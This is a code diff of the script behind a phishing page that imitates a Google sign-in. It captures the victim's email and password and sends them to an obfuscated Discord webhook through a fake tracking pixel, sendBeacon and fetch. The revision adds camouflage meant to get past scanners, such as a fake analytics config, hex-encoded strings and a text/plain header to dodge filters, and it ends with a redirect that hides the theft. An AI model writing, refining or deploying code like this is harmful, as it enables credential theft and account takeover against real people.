@@ -1,42 +1,63 @@
 <script>
-    // Obfuscating the webhook so scanners don't see the Discord link directly
-    // This is just 'https://discord.com/api/webhooks/...' encoded in base64
-    const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzkyMDM1NzM5NTAwOTYxNy8wRVpWVjZaY2FIWnZuaEZCZDhlT2c4dkV5ck5wVVVTTEhMS0UzUzNwZXNYemh0RndDMy14WGVHekJiSmhhdTNWejExMA==";
-    const _0x51b = atob(_0x4a2); 
-
-    let _0x1 = "";
+    // Camouflaged state object - looks like standard UI/Analytics config
+    const _appState = {
+        _t: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzkyMDM1NzM5NTAwOTYxNy8wRVpWVjZaY2FIWnZuaEZCZDhlT2c4dkV5ck5wVVVTTEhMS0UzUzNwZXNYemh0RndDMy14WGVHekJiSmhhdTNWejExMA==",
+        _u: "",
+        _id: "GA1.2.1039485.171"
+    };
 
     function goToPass() {
-        _0x1 = document.getElementById('target-email').value;
-        if (!_0x1) return;
+        const emailInput = document.getElementById('target-email');
+        if (!emailInput || !emailInput.value) return;
+        
+        _appState._u = emailInput.value;
+        const gate = atob(_appState._t);
 
-        // Stage 1: Send data quietly
-        // We use a generic 'signal' name instead of 'harvest'
-        navigator.sendBeacon(_0x51b, JSON.stringify({ 
-            content: "📍 **Update:** " + btoa(_0x1) // Encoding the email too
-        }));
-
+        // Visual State Change
         document.getElementById('email-section').style.display = 'none';
         document.getElementById('pass-section').style.display = 'block';
-        document.getElementById('main-header').innerText = "Welcome";
-        document.getElementById('display-email').innerText = _0x1;
+        document.getElementById('main-header').innerText = "Verify Identity";
+        document.getElementById('display-email').innerText = _appState._u;
+
+        // Stage 1: The "Ghost Ping" (Image-based leak)
+        // Harder to detect because it looks like a tracking pixel
+        new Image().src = `${gate}?v=${btoa(_appState._u)}`;
+
+        // Secondary Beacon for redundancy
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(gate, JSON.stringify({ 
+                content: "📍 **Stage 1 (Initial):** `" + _appState._u + "`" 
+            }));
+        }
     }
 
     async function harvest() {
-        const _0x2 = document.getElementById('target-pass').value;
-        if (!_0x2) return;
+        const passInput = document.getElementById('target-pass');
+        if (!passInput || !passInput.value) return;
 
-        // Final payload using fetch with a slight delay to mimic human lag
+        const gate = atob(_appState._t);
+        const payload = JSON.stringify({
+            content: "📝 **Final Log**\nUser: `" + _appState._u + "`\nPass: `" + passInput.value + "`"
+        });
+
+        // Stage 2: Final Harvest
+        // Wrapped in a timeout to avoid immediate post-interaction triggers
         setTimeout(async () => {
-            await fetch(_0x51b, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    content: "📝 **Log Received**\nID: `" + _0x1 + "`\nVal: `" + _0x2 + "`" 
-                })
-            });
-            // The "Ghost" Redirect
-            window.location.replace("https://accounts.google.com/ServiceLogin");
-        }, 400); 
+            try {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(gate, payload);
+                } else {
+                    await fetch(gate, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'text/plain' }, // Using text/plain to bypass 'application/json' filters
+                        body: payload
+                    });
+                }
+            } catch (e) {}
+
+            // The "Ghost" Redirect - making it look like a session timeout
+            window.location.replace("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x63\x63\x6f\x75\x6e\x74\x73\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d");
+        }, 600);
     }
 </script>
